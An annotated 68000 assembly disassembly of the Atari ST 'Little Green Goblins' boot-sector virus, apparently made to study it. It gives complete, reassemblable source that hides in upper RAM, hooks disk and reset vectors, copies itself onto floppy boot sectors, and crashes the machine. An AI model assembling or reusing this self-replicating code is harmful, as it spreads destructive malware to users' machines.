; Little Green Goblins Virus
; Known names: Goblins Virus
; Symptoms: after 3 copies it will Y-reverse the GEM menu, after 115 copies it will display the message "The Green Goblins Strike Again" and crashes.
; Replication: on A or B, based on Getbpb(dev) call, it checks if dev is C and do nothing in this case.
; Resident address: PHYSTOP-0x200 to PHYSTOP (0xFFFE0 on 1MB ST).. Counter at 0xFFF80
; Bootcode size: 474 bytes 
; Bootcode start: 0x1E
; Stealth location: PHYSTOP-0x8200 = 0xF7E00 on 1MB ST
; Attached vectors: hdv_bpb, resvector
; Reset resistance: Yes
; TOS compatible: Needs TOS meminit to be located at 0xFC0074
;
; What's special? 
; - The reset vector is only used to install in stealth memory a routine to set again hdv_bpb. I don't get the idea.
; - It protects itself by decreasing PHYSTOP of 512 bytes, where it is located.
; - It also "hides" FLOPRD and FLOPWR on bootsector calls using a helper routine getting opcode, count and dev as params.
; - It doesn't replicate if the bootsector has a signature (1 long value) after the counter, It doesn't copy itself in PHYSTOP-0x200 if the signature is also there.
; - In the version I found, the counter is initialized at 13 and no 0 (so the 3 / 115 steps).

; ----------------------------------------------------------------------------------------------------------
; Registers
; ----------------------------------------------------------------------------------------------------------
RESVALID                        equ $426                ; $000426|long |Validates resvector if $31415926                        |resvalid
RESVECTOR                       equ $42A                ; $00042A|long |Reset vector                                            |resvector
PHYSTOP                         equ $42E                ; $00042E|long |Physical top of RAM 0x100000 on 1MB ST                  |phystop
VRAM_PTR                        equ $44E                ; $00044E|long |Pointer to video RAM (logical screen base)              |_v_bas_ad
HDV_BPB                         equ $472                ; $000472|long |Vector for getbpb for hard disk                         |hdv_bpb
DISKBUFP                        equ $4C6                ; $0004C6|long |Pointer to 1024-byte disk buffer                        |_dskbufp
TOS_MEMINIT                     equ $FC0074             ; TOS 1.0 meminit routine (https://github.com/th-otto/tos1x/blob/master/bios/startup.S#L248)

; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------
BOOT_CHK                        equ $1234
RESVECTOR_MAGIC                 equ $31415926           ; magic number to setup the reset vector
RESIDENT_CHK                    equ $5678               ; checksum for resident programs
RESIDENT_MAGIC                  equ $12123456

; virus specific
BOOTSECTOR_START                equ $601C
COUNTER_START_VALUE             equ $0000000D           ; 0000000F will trigger screen reverse after first copy
NB_LINES                        equ 8                   ; 200 will reverse whole screen

; ----------------------------------------------------------------------------------------------------------
; Pointers
; ----------------------------------------------------------------------------------------------------------
COUNTER_OFFSET                  equ (COUNTER-START)
RESET_VECTOR_OFFSET             equ (RESET_VECTOR-START)
HDV_BPB_VECTOR_OFFSET           equ (HDV_BPB_VECTOR-START)

HDV_BPB_VECTOR_JMP_ADDR         equ (JUMP_TO_OLD_VECTOR-START)+2
COUNTER_ADDR                    equ COUNTER_OFFSET + $1E

; ----------------------------------------------------------------------------------------------------------
; Variables
; ----------------------------------------------------------------------------------------------------------


; ----------------------------------------------------------------------------------------------------------
; Start
; ----------------------------------------------------------------------------------------------------------
START:
        LEA       HDV_BPB_VECTOR_JMP_ADDR(PC),A0
        MOVE.L    HDV_BPB,(A0)                      ; Patch JMP call using HDV_BPB address
        MOVEA.L   PHYSTOP,A6
        LEA       COUNTER_OFFSET(A6),A5             ; Signature is located at COUNTER+4 but not at PHYSTOP+COUNTER+4 but PHYSTOP-0x200+COUNTER+4
        MOVE.L    $4(A5),D0                         ; is it a bug?
        CMP.L     SIGNATURE(PC),D0                  ; Don't copy if already in memory
        BEQ.W     .done

        SUBA.L    #$200,A6                          ; protect itself by "reducing" the available
        MOVE.L    A6,PHYSTOP                        ; top free memory given by PHYSTOP
        MOVEA.L   A6,A5
        BSR.W     COPY_BOOTCODE                     ; copy bootcode to PHYSTOP-0x200

        MOVEA.L   A6,A5
        ADDA.W    #RESET_VECTOR_OFFSET,A5           ; Get reset vector ptr
        MOVE.L    #RESVECTOR_MAGIC,RESVALID.L       ; Set magic number
        MOVE.L    A5,RESVECTOR.L                    ; Set new reset vector

        ADDA.W    #HDV_BPB_VECTOR_OFFSET,A6
        MOVE.L    A6,HDV_BPB.L                      ; Set new hdv_bpb vector
.done:
        RTS

; ----------------------------------------------------------------------------------------------------------
; COPY_BOOTCODE
; A5: destination ptr
; ----------------------------------------------------------------------------------------------------------        
COPY_BOOTCODE:
        LEA       START(PC),A1
        MOVE.W    #$ED,D0                           ; for d0 = 237 to 0
.copy:
        MOVE.W    (A1)+,(A5)+                       ; copy 238*2 bytes
        DBF       D0,.copy
        RTS

; ----------------------------------------------------------------------------------------------------------
; At reset, this routine will set up the resident program to be executed at boot (then cleaned by TOS)
; Not clear what it does....
; ---------------------------------------------------------------------------------------------------------- 
RESET_VECTOR:
        LEA       PATCHED_ROUTINE(PC),A0            ; routine ptr
        MOVEA.L   PHYSTOP,A1                        ; A1 = PHYSTOP
        SUBA.L    #$8200,A1                         ; A1 = PHYSTOP - 0x8200 = 0xF7E00 on 1MB ST
        MOVEA.L   A1,A2                             ; A2 = A1
        MOVE.L    #RESIDENT_MAGIC,(A1)+             ; Set Magic number in A1
        MOVE.L    A2,(A1)+                          ; Then routine address as expected by undocumented TOS feature
        
        LEA       HDV_BPB_VECTOR_OFFSET(PC),A6      ; A6 = hdv_bpb new vector ptr

        ; Define the content to be executed at boot: set the new hdv_bpb vector and that's it
        ;   MOVE.L    #HDV_BPB_VECTOR_ADDR,HDV_BPB
        ;   RTS
        ;   DC.L $0
        MOVE.W    (A0)+,(A1)+                       ; copy PATCHED_ROUTINE MOVE.L opcode, 2 bytes
        ADDQ.W    #4,A0                             ; skip value (0)
        MOVE.L    A6,(A1)+                          ; copy new hdv_bpb address => 4 bytes
        MOVE.L    (A0)+,(A1)+                       ; copy HDV_BPB then RTS => 4 bytes
        MOVE.L    (A0)+,(A1)                        ; then DC.L $0 => 4 bytes  => 4+4+4+2 = 14 bytes patched. Not sure what is the goal of the DC.L $0
        
        CLR.W     D0                                ; clear d0
        MOVE.W    #$FF,D1                           ; for d1 = 255 to 0
        MOVE.W    #RESIDENT_CHK,D2
.calc_resident_checksum:
        ADD.W     (A2)+,D0                          ; compute word checksum
        DBF       D1,.calc_resident_checksum
        SUB.W     D0,D2                             ; adjust checksum
        MOVE.W    D2,$2(A1)                         ; write checksum

        JMP       TOS_MEMINIT                       ; go back to TOS

; ----------------------------------------------------------------------------------------------------------
; PATCHED_ROUTINE to be installed on reset routine: 14 bytes
; ---------------------------------------------------------------------------------------------------------- 
PATCHED_ROUTINE:
        MOVE.L    #$0,HDV_BPB                       ; $0 will be patched by RESET_VECTOR to be HDV_BPB_VECTOR_ADDR
        RTS
        DC.L      $00000000                         ; ???? Useless?

; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR
; ---------------------------------------------------------------------------------------------------------- 
HDV_BPB_VECTOR:
        MOVE.W    $4(sp),D0                         ; first param of Getbpb(dev)
        CMP.W     #$2,D0                            ; if 2 => harddrive, do nothing, continue to old vector
        BGE.W     JUMP_TO_OLD_VECTOR

        MOVEM.L   D0/D1/D2/D3/D4/D5/D6/D7/A0/A1/A2/A3/A4/A5/A6,-(sp)

        ; Read bootsector
        MOVEQ     #1,D6                             ; D6 = count
        MOVE.W    D0,D7                             ; D7 = dev
        MOVEQ     #8,D5                             ; D5 = 8 => FLOPRD
        BSR.W     FLOP_HELPER
        TST.L     D0                                ; if error, do nothing
        BMI.W     DO_NOTHING
        
        ; Check if virus signature is there
        LEA       COUNTER_ADDR(A6),A5               ; A6 is used as FLOPRD bufer
        MOVE.L    $4(A5),D0                         ; if signature in FLOPRD buffer, do nothing, SIGNATURE is located at COUNTER_ADDR+4
        CMP.L     SIGNATURE(PC),D0
        BEQ.W     DO_NOTHING

        ; Patch boosector
        MOVE.W    #BOOTSECTOR_START,(A6)            ; Add branch
        LEA       $1E(A6),A5                        ; A5: destination pointer = bootcode location in buffer
        BSR.W     COPY_BOOTCODE
        MOVEA.L   A6,A5
        MOVE.W    #$FE,D1                           ; for d1 = 254 to 0
        MOVE.W    #BOOT_CHK,D0
.calc_boot_checksum:
        SUB.W     (A5)+,D0                          ; compute word checksum
        DBF       D1,.calc_boot_checksum
        MOVE.W    D0,(A5)                           ; set checksum 

        ; Write bootsector
        MOVEQ     #9,D5                             ; D9 = FLOPWR
        BSR.W     FLOP_HELPER
        TST.L     D0                                ; error ?
        BMI.W     DO_NOTHING

        ; Check if time for symptoms
        LEA       COUNTER(PC),A0                    ; get counter in upper ram
        ADDQ.L    #1,(A0)
        MOVE.L    (A0),D0
        ANDI.W    #$7F,D0                           ; if counter == 128
        BEQ.W     SHOW_MESSAGE                      ; show message (And crashes due to BRA)

        MOVE.L    (A0),D0                           
        ANDI.W    #$F,D0                            ; if counter != 16
        BNE.W     DO_NOTHING                        ; do nothing, else....  

        ; Y reverse GEM top menu
        MOVEA.L   VRAM_PTR,A0                       ; get Video RAM ptr in A0
        MOVEA.L   A0,A1                             ; A1 = A0
        ADDA.W    #$A0*NB_LINES,A1                  ; A1 = VRAM[NB_LINES*160] => NB_LINES th line
        MOVEA.L   DISKBUFP,A6                       ; A6 = floppy buffer
        MOVEQ     #(NB_LINES/2)-1,D0                ; for D0 = NB_LINES/2 to 0, stop at half Y
.loop:
        MOVEA.L   A0,A2                             
        MOVEA.L   A1,A3
        MOVEQ     #7,D1                             ; for D1 = 7 to 0 => 8 times to finish the line
.one_row_loop:
        MOVEM.L   (A2),D2/D3/D4/D5/D6               ; invert 5*4 20 bytes of VRAM[i] to VRAM[NBL_LINES*160-i] 
        MOVEM.L   D2/D3/D4/D5/D6,(A6)
        MOVEM.L   (A3),D2/D3/D4/D5/D6
        MOVEM.L   D2/D3/D4/D5/D6,(A2)
        MOVEM.L   (A6),D2/D3/D4/D5/D6
        MOVEM.L   D2/D3/D4/D5/D6,(A3)
        ADDA.W    #$14,A2                           ; advance VRAM[i] of 20 bytes                          
        ADDA.W    #$14,A3                           ; advance VRAM[NBL_LINES*160-i] of 20 bytes   
        DBRA      D1,.one_row_loop

        ADDA.W    #$A0,A0                           ; next VRAM line (160 bytes)
        SUBA.W    #$A0,A1                           ; previous VRAM line
        DBF       D0,.loop                          ; do it 4 times

DO_NOTHING:
        MOVEM.L   (sp)+,D0/D1/D2/D3/D4/D5/D6/D7/A0/A1/A2/A3/A4/A5/A6
JUMP_TO_OLD_VECTOR:
        JMP       $FC0FCA                           ; will be patched to contain new hdv_bpb vector address

; ----------------------------------------------------------------------------------------------------------
; COUNTER: symptoms counter
; trigger screen mess at 16 and message and bombs at 128 (if set at 0)
; ---------------------------------------------------------------------------------------------------------- 
COUNTER:
        DC.L      COUNTER_START_VALUE

; ----------------------------------------------------------------------------------------------------------
; SIGNATURE: used to check if the virus is in the bootsector or in upper ram
; ---------------------------------------------------------------------------------------------------------- 
SIGNATURE:
        DC.L      $27182818

; ----------------------------------------------------------------------------------------------------------
; SHOW_MESSAGE
; ----------------------------------------------------------------------------------------------------------        
SHOW_MESSAGE:
        PEA       MESSAGE(PC)                       ; str = MESSAGE
        MOVE.W    #$9,-(sp)                         ; void CCONWS( str ), show message on screen
        TRAP      #1                                ; 
        ADDQ.L    #6,sp                             ; fix stack

        BRA.W     DO_NOTHING                        ; going back to HDV_BPB_VECTOR end part, not sure why it crashes

; ----------------------------------------------------------------------------------------------------------
; 
; ---------------------------------------------------------------------------------------------------------- 
MESSAGE:
        DC.B      'The Little Green Goblins Strike Again',0

; ----------------------------------------------------------------------------------------------------------
; FLOP_HELPER: wrapper to reuse and hide trap calls
; D5 = FLOPRD or FLOPWR
; D6 = count
; D7 = dev
; ---------------------------------------------------------------------------------------------------------- 
FLOP_HELPER:
        MOVE.W    D6,-(sp)                          ; count = D6
        CLR.L     -(sp)                             ; side = 0 | track = 0
        MOVE.W    D6,-(sp)                          ; sector = D6
        MOVE.W    D7,-(sp)                          ; dev = D7
        CLR.L     -(sp)                             ; rervd = 0
        MOVEA.L   DISKBUFP,A6                       ; A6 = DISKBUFP
        MOVE.L    A6,-(sp)                          ; buf = DISKBUFP
        MOVE.W    D5,-(sp)                          ; FLOPRD or FLOPWR
        TRAP      #14                                ; Xbios
        ADDA.W    #20,sp                            ; fix stack       
        RTS

    END
